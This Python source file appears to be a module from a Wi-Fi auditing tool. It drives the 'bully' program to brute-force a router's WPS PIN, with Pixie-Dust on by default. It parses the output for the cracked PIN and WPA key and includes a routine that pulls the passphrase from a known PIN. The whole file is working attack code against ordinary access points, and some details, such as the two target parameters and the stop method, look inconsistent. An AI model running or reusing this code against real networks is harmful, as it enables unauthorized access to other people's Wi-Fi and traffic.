#!/usr/bin/env python
# -*- coding: utf-8 -*-

from .dependency_win import Dependency
from .airodump_win import Airodump
from ..model.attack_win import Attack
from ..model.wps_result_win import CrackResultWPS
from ..util.color_win import Color
from ..util.timer import Timer
from ..util.process_win import Process
from ..config_win import Configuration

import time
import re
from threading import Thread


class Bully(Attack, Dependency):
    dependency_required = False
    dependency_name = 'bully'
    dependency_url = 'https://github.com/kimocoder/bully'

    def __init__(self, target2, target3, pixie_dust=True):
        super().__init__(target3)
        self.pid = None
        self.target = target2
        self.pixie_dust = pixie_dust

        self.total_attempts = 0
        self.total_timeouts = 0
        self.total_failures = 0
        self.locked = False
        self.state = '{O}Waiting for beacon{W}'
        self.start_time = time.time()
        self.last_pin = ""
        self.pins_remaining = -1
        self.eta = ''

        self.cracked_pin = self.cracked_key = self.cracked_bssid = self.cracked_essid = None
        self.crack_result = None

        self.cmd = []

        if Process.exists('stdbuf'):
            self.cmd.extend([
                'stdbuf', '-o0'  # No buffer. See https://stackoverflow.com/a/40453613/7510292
            ])

        self.cmd.extend([
            'bully',
            '--bssid', target2.bssid,
            '--channel', target2.channel,
            # '--detectlock', # Detect WPS lockouts unreported by AP

            # Restoring session from '/root/.bully/34210901927c.run'
            # WARNING: WPS checksum was bruteforced in prior session, now autogenerated
            # Use --force to ignore above warning(s) and continue anyway
            '--force',

            '-v', '4',
            Configuration.interface
        ])

        if self.pixie_dust:
            self.cmd.insert(-1, '--pixiewps')

        self.bully_proc = None

    def run(self):
        with Airodump(channel=self.target.channel,
                      target_bssid=self.target.bssid,
                      skip_wps=True,
                      output_file_prefix='wps_pin') as airodump:
            # Wait for target
            self.pattack('Waiting for target to appear...')
            self.target = self.wait_for_target(airodump)

            # Start bully
            self.bully_proc = Process(self.cmd,
                                      stderr=Process.devnull(),
                                      bufsize=0,
                                      cwd=Configuration.temp())

            # Start bully status thread
            t = Thread(target=self.parse_line_thread)
            t.daemon = True
            t.start()

            try:
                self._run(airodump)
            except (KeyboardInterrupt, Exception) as e:
                self.stop()
                raise e
        if self.crack_result is None:
            self.pattack('{R}Failed{W}', newline=True)

    def _run(self, airodump):
        while self.bully_proc.poll() is None:
            try:
                self.target = self.wait_for_target(airodump)
            except Exception as e:
                self.pattack('{R}Failed: {O}%s{W}' % e, newline=True)
                Color.pexception(e)
                self.stop()
                break

            # Update status
            self.pattack(self.get_status())

            # Thresholds only apply to Pixie-Dust
            if self.pixie_dust:
                # Check if entire attack timed out.
                if self.running_time() > Configuration.wps_pixie_timeout:
                    self.pattack('{R}Failed: {O}Timeout after %d seconds{W}' % (
                        Configuration.wps_pixie_timeout), newline=True)
                    self.stop()
                    return

                # Check if timeout threshold was breached
                if self.total_timeouts >= Configuration.wps_timeout_threshold:
                    self.pattack('{R}Failed: {O}More than %d Timeouts{W}' % (
                        Configuration.wps_timeout_threshold), newline=True)
                    self.stop()
                    return

                # Check if WPSFail threshold was breached
                if self.total_failures >= Configuration.wps_fail_threshold:
                    self.pattack('{R}Failed: {O}More than %d WPSFails{W}' % (
                        Configuration.wps_fail_threshold), newline=True)
                    self.stop()
                    return
            elif self.locked and not Configuration.wps_ignore_lock:
                self.pattack('{R}Failed: {O}Access point is {R}Locked{O}',
                             newline=True)
                self.stop()
                return

            time.sleep(0.5)

    def pattack(self, message, newline=False):
        # Print message with attack information.
        if self.pixie_dust:
            # Count down
            time_left = Configuration.wps_pixie_timeout - self.running_time()
            attack_name = 'Pixie-Dust'
        else:
            # Count up
            time_left = self.running_time()
            attack_name = 'PIN Attack'

        if self.eta:
            time_msg = '{D}ETA:{W}{C}%s{W}' % self.eta
        else:
            time_msg = '{C}%s{W}' % Timer.secs_to_str(time_left)

        if self.pins_remaining >= 0:
            time_msg += ', {D}PINs Left:{W}{C}%d{W}' % self.pins_remaining
        else:
            time_msg += ', {D}PINs:{W}{C}%d{W}' % self.total_attempts

        Color.clear_entire_line()
        Color.pattack('WPS', self.target, attack_name,
                      '{W}[%s] %s' % (time_msg, message))

        if newline:
            Color.pl('')

    def running_time(self):
        return int(time.time() - self.start_time)

    def get_status(self):
        main_status = self.state

        meta_statuses = []
        if self.total_timeouts > 0:
            meta_statuses.append('{O}Timeouts:%d{W}' % self.total_timeouts)

        if self.total_failures > 0:
            meta_statuses.append('{O}Fails:%d{W}' % self.total_failures)

        if self.locked:
            meta_statuses.append('{R}Locked{W}')

        if meta_statuses:
            main_status += f" ({', '.join(meta_statuses)})"

        return main_status

    def parse_line_thread(self):
        for line in iter(self.bully_proc.pid.stdout.readline, b''):
            if line == '':
                continue
            line = line.decode('utf-8')
            line = line.replace('\r', '').replace('\n', '').strip()

            if Configuration.verbose > 1:
                Color.pe('\n{P} [bully:stdout] %s' % line)

            self.state = self.parse_state(line)

            self.crack_result = self.parse_crack_result(line)

            if self.crack_result:
                break

    def parse_crack_result(self, line):
        if pin_key_re := re.search(r"Pin is '(\d*)', key is '(.*)'", line):
            self.cracked_pin = pin_key_re[1]
            self.cracked_key = pin_key_re[2]

        ###############
        # Check for PIN
        if self.cracked_pin is None:
            if pin_re := re.search(r"^\s*PIN\s*:\s*'(.*)'\s*$", line):
                self.cracked_pin = pin_re[1]

            if pin_re := re.search(r"^\[Pixie-Dust] PIN FOUND: '?(\d*)'?\s*$", line):
                self.cracked_pin = pin_re[1]

            if self.cracked_pin is not None:
                # Mention the PIN & that we're not done yet.
                self.pattack('{G}Cracked PIN: {C}%s{W}' % self.cracked_pin, newline=True)

                self.state = '{G}Finding Key...{C}'
                time.sleep(2)
                print('Cracked line: ', line)

        if key_re := re.search(r"^\s*KEY\s*:\s*'(.*)'\s*$", line):
            self.cracked_key = key_re[1]

        if self.cracked_pin and self.cracked_key:
            self.pattack('{G}Cracked Key: {C}%s{W}' % self.cracked_key, newline=True)
            self.crack_result = CrackResultWPS(
                bssid=self.target.bssid,
                essid=self.target.essid,
                pin=self.cracked_pin,
                psk=self.cracked_key)
            Color.pl('')
            self.crack_result.dump()

        return self.crack_result

    def parse_state(self, line):  # sourcery no-metrics
        state = self.state

        if re.search(r".*Got beacon for '(.*)' \((.*)\)", line):
            # group(1)=ESSID, group(2)=BSSID
            state = 'Got beacon'

        if last_state := re.search(r".*Last State = '(.*)'\s*Next pin '(.*)'", line):
            # group(1)=NoAssoc, group(2)=PIN
            pin = last_state[2]
            if pin != self.last_pin:
                self._extracted_from_parse_state_12(pin)
            state = 'Trying PIN'

        if mx_result_pin := re.search(r".*[RT]x\(\s*(.*)\s*\) = '(.*)'\s*Next pin '(.*)'", line):
            state = self._extracted_from_parse_state_20(mx_result_pin)
        if re_tested := re.search(r'Run time ([\d:]+), pins tested (\d)+', line):
            # group(1)=01:23:45, group(2)=1234
            self.total_attempts = int(re_tested[2])

        if re_remaining := re.search(r' (\d+) pins remaining', line):
            self.pins_remaining = int(re_remaining[1])

        if re_eta := re.search(r'time to crack is (\d+) hours, (\d+) minutes, (\d+) seconds', line):
            h, m, s = re_eta.groups()
            self.eta = f"{h.rjust(2, '0')}h{m.rjust(2, '0')}m{s.rjust(2, '0')}s"

        if re_lockout := re.search(r".*WPS lockout reported, sleeping for (\d+) seconds", line):
            self.locked = True
            sleeping = re_lockout[1]
            state = '{R}WPS Lock-out: {O}Waiting %s seconds...{W}' % sleeping

        if re.search(r".*\[Pixie-Dust] WPS pin not found", line):
            state = '{R}Failed: {O}Bully says "WPS pin not found"{W}'

        if re.search(r".*Running pixiewps with the information", line):
            state = '{G}Running pixiewps...{W}'
        return state

    # TODO Rename this here and in `parse_state`
    def _extracted_from_parse_state_20(self, mx_result_pin):
        # group(1)=M1,M2,..,M7, group(2)=result, group(3)=Next PIN
        self.locked = False
        m_state = mx_result_pin[1]
        result = mx_result_pin[2]
        pin = mx_result_pin[3]
        if pin != self.last_pin:
            self._extracted_from_parse_state_12(pin)
        if result in ['Pin1Bad', 'Pin2Bad']:
            result = '{G}%s{W}' % result
        elif result == 'Timeout':
            self.total_timeouts += 1
            result = '{O}%s{W}' % result
        elif result == 'WPSFail':
            self.total_failures += 1
            result = '{O}%s{W}' % result
        elif result == 'NoAssoc':
            result = '{O}%s{W}' % result
        else:
            result = '{R}%s{W}' % result

        result = '{P}%s{W}:%s' % (m_state.strip(), result.strip())
        result = f'Trying PIN ({result})'

        return result

    # TODO Rename this here and in `parse_state`
    def _extracted_from_parse_state_12(self, pin):
        self.last_pin = pin
        self.total_attempts += 1
        if self.pins_remaining > 0:
            self.pins_remaining -= 1

    def stop(self):
        if hasattr(self, 'pid') and self.pid and self.pid.poll() is None:
            self.pid.interrupt()

    def __del__(self):
        self.stop()

    @staticmethod
    def get_psk_from_pin(target3, pin):
        # Fetches PSK from a Target assuming 'pin' is the correct PIN
        """
        bully --channel 1 --bssid 34:21:09:01:92:7C --pin 01030365 --bruteforce wlan0mon
        PIN   : '01030365'
        KEY   : 'password'
        BSSID : '34:21:09:01:92:7c'
        ESSID : 'AirLink89300'
        """
        cmd = [
            'bully',
            '--channel', target3.channel,
            '--bssid', target3.bssid,
            '--pin', pin,
            '--bruteforce',
            '--force',
            Configuration.interface
        ]

        bully_proc = Process(cmd)

        for line in bully_proc.stderr().split('\n'):
            key_re = re.search(r"^\s*KEY\s*:\s*'(.*)'\s*$", line)
            if key_re is not None:
                return key_re[1]

        return None


if __name__ == '__main__':
    Configuration.initialize()
    Configuration.interface = 'wlan0mon'
    from ..model.target import Target

    fields = '34:21:09:01:92:7C,2015-05-27 19:28:44,2015-05-27 ' \
             '19:28:46,1,54,WPA2,CCMP TKIP,PSK,-58,2,0,0.0.0.0,9,AirLink89300,'.split(',')
    target = Target(fields)
    psk = Bully.get_psk_from_pin(target, '01030365')
    print(('psk', psk))

    # stdout = " [*] Pin is '11867722', key is '9a6f7997'"
    # Configuration.initialize(False)
    # from ..model.target import Target
    # fields = 'AA:BB:CC:DD:EE:FF,2015-05-27 19:28:44,2015-05-27 19:28:46,1,54,WPA2,' \
    #          'CCMP TKIP,PSK,-58,2,0,0.0.0.0,9,HOME-ABCD,'.split(',')
    # target = Target(fields)
    # b = Bully(target)
    # b.parse_line(stdout)
